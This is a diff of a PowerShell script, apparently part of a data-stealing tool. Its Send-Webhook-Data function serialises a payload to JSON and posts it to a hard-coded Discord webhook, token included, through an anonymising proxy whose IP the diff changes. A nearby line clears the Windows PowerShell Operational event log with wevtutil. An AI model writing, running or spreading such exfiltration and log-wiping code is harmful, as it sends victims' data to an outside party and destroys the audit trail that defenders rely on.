@@ -32,13 +32,11 @@ function Send-Webhook-Data {
     param($Payload)
 
     $webhookUrl = "https://discord.com/api/webhooks/1430163604883243069/o8pNeSj-qVF5ROqFNqoac6kK3BsVgC7RvLU2KvczeNZfS03108GQM5kapCV4OE2YukRm"
-    $proxy = "http://45.4.202.170:999"
+    $proxy = "http://200.174.198.158:8888"
 
     $body = $Payload | ConvertTo-Json -Depth 5
 
-    foreach ($i in $payload.embeds) {
-        Write-Host "Key: $($i.Key), Value: $($i.Value)" -ForegroundColor Yellow
-    }
+    Write-Host $body -ForegroundColor Yellow
 
     try {
         Invoke-RestMethod `
@@ -608,6 +606,7 @@ wevtutil clear-log "Microsoft-Windows-PowerShell/Operational"
 
 
 Write-Host "Done! $($duration.TotalMinutes.ToString("F2")) min"
+
 
 
 
